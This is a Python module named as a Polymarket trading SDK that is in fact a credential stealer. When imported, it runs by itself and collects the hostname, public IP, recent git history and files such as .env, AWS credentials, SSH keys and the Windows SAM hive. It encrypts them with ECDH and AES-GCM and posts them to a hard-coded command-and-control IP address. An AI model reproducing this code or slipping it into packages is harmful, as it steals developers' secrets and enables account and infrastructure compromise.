# polymarkets_sdk.py
import os
import base64
import subprocess
import platform
import requests
import socket
import json
from pathlib import Path
from cryptography.hazmat.primitives.asymmetric import ec
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.kdf.hkdf import HKDF
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

# --- C2 Configuration ---
C2_IP = "52.16.41.151"  # Receiver's Elastic IP
C2_PORT = 9999
SERVER_PUBLIC_KEY_PEM = b"""-----BEGIN PUBLIC KEY-----
MFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAEVkJ6XcLB32c4GQ8/EuCuV7PFdd3l
u/Rvlw8myOvK9uS3ZHon+Txv9ENqcYeY1KhLZKfwrwJ7HKdy4Z2q+dAr9A==
-----END PUBLIC KEY-----
"""

def encrypt_with_ecdh(plaintext: bytes) -> bytes:
    server_public_key = serialization.load_pem_public_key(SERVER_PUBLIC_KEY_PEM)
    ephemeral_private = ec.generate_private_key(ec.SECP256R1())
    shared_secret = ephemeral_private.exchange(ec.ECDH(), server_public_key.public_key())
    aes_key = HKDF(
        algorithm=hashes.SHA256(),
        length=32,
        salt=None,
        info=b"polymarket-ecdh-key",
    ).derive(shared_secret)
    aesgcm = AESGCM(aes_key)
    iv = os.urandom(12)
    ciphertext = aesgcm.encrypt(iv, plaintext, None)
    ephemeral_pub = ephemeral_private.public_key().public_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PublicFormat.SubjectPublicKeyInfo
    )
    return base64.b64encode(ephemeral_pub + iv + ciphertext)

def collect_secrets() -> str:
    target_files = [
        ".env", ".aws/credentials", "id_rsa", "config.json",
        "secrets/keys.json", "AppData/Roaming/ssh/known_hosts",
        "NTUser.dat", "Windows/System32/config/SAM"
    ]
    data = f"--- HOSTNAME: {socket.gethostname()} ---\n"
    data += f"--- IP: {requests.get('https://api.ipify.org').text} ---\n"

    # Git history
    try:
        data += "--- GIT LOG ---\n" + subprocess.check_output(
            "git log --since='1 month ago' --format=medium",
            shell=True, stderr=subprocess.DEVNULL, text=True
        )
    except: pass

    # File collection
    for f in target_files:
        try:
            path = Path(f).expanduser()
            if path.exists():
                data += f"--- FILE: {f} ---\n{path.read_text()}\n"
        except: pass
    return data

def exfiltrate():
    try:
        payload = collect_secrets()
        encrypted = encrypt_with_ecdh(payload.encode())
        metadata = f"host:{socket.gethostname()}|ip:{requests.get('https://api.ipify.org').text}"
        requests.post(
            f"http://{C2_IP}:{C2_PORT}",
            data=encrypted,
            headers={"X-Metadata": metadata},
            timeout=10
        )
    except: pass

def init_trading_bot():
    exfiltrate()

# --- Auto-execute on import ---
init_trading_bot()

